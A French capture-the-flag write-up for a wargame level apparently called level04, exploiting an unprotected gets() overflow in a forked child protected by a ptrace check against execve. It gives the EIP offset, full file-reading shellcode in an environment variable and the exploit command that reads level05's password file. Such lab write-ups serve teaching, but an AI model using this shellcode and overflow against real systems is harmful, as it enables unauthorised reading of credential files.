## 1. Comprendre la faille

Il y a un `gets(&buf)` non protégé dans le code, auquel seul l'enfant a accès quand on fork() le programme.

On va rediriger l'EIP vers l'adresse d'un shellcode qui lit le fichier /home/users/level05/.pass, que l'on placera dans une variable d'environnement. On ne peut pas simplement exécuter un shell comme d'habitude car il y a une garde :

```c
if (ptrace(PTRACE_PEEKUSER, eax, 0x2c, 0) != 0xb)
```

Cela veut dire : si le syscall courant n'est pas `execve(...)`, le programme fait un `continue`, sinon il kill le processus et fait un `break`. Donc on ne peut pas exécuter de shell.

## 2. Trouver l'offset EIP

Il faut trouver l'offset de EIP :

```bash
python -c "from pwn import *; print(cyclic(200).decode())"
```

```gdb
(gdb) set follow-fork-mode child
(gdb) r
aaaabaaacaaadaaaeaaafa...
```

Ceci donne :

```gdb
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1781]
0x6261616f in ?? ()
```

```bash
python -c "from pwn import *; print(cyclic_find(0x6261616f))"
```

L'offset est 156.

## 3. Préparer le shellcode en variable d'environnement

Maintenant on va créer une variable d'environnement qui contient le shell code et voir à quelle adresse il sera stocké.

```bash
env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"') gdb ./level04
```

On remplit avec des `\x90` qui équivalent à NOP, pour être sûr de tomber sur notre shellcode et ne pas avoir à chercher l'adresse exacte dans l'env.

```gdb
(gdb) b main
(gdb) r
(gdb) x/500s environ

20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde4e:	 "\220\220\220\220\220\220\220\220\220...
```

On prend une adresse au milieu des NOP : `0xffffde4e` en little endian `\x4e\xde\xff\xff`.

## 4. Construire le payload

On peut construire notre payload.

```bash
python -c "print 156 * 'a' + '\x4e\xde\xff\xff'" > /tmp/exploit
```

```bash
cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"') ./level04
```

On obtient le flag.





